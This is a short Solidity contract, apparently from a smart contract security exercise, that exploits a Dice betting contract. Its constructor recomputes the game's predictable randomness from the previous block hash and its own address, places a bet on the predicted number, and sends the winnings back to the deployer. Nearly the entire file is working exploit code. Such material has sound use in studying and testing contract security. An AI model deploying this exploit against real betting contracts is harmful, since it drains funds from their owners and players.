// SPDX-License-Identifier: BEER-WARE
pragma solidity ^0.8.9;

import "../Dice.sol";
import "hardhat/console.sol";

contract FixedDiceExploit1 {

  constructor(Dice dice) payable {

    console.log("balance before exploit: %d", address(this).balance);

    uint seed = uint(blockhash(block.number - 1)) % uint160(address(this));
    uint number = seed % 100;

    dice.register("pwner");
    dice.rollDice{value : msg.value}(number);

    console.log("balance after exploit: %d", address(this).balance);

    uint balance = address(this).balance;
    (bool ok,) = msg.sender.call{value : balance}("");
    require(ok, "fail");
  }

  receive() external payable {
    console.log('got payment!');
  }

}
